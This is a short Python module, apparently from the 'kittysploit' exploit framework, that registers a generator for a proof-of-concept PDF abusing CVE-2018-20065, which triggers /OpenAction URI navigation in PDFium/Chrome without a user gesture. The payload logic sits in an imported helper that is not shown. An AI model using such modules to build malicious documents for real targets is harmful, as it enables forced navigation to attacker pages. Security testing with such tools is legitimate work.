#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.actions import write_pdfium_openaction_uri


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2018-20065 PDFium URI No-Gesture',
        "description": 'Generate PDF PoC for CVE-2018-20065: /OpenAction /URI navigation without user gesture in PDFium/Chrome.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2018-20065'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2018-20065'],
        "tags": ['pdf', 'cve-2018-20065', 'pdfium', 'chrome', 'uri'],
    }

    PDF_GENERATORS = (
        write_pdfium_openaction_uri,
    )

    CVE_IDS = ['CVE-2018-20065']
    MODULE_TITLE = 'PDF CVE-2018-20065 PDFium URI No-Gesture'

    def run(self):
        return self.run_pdf_cve()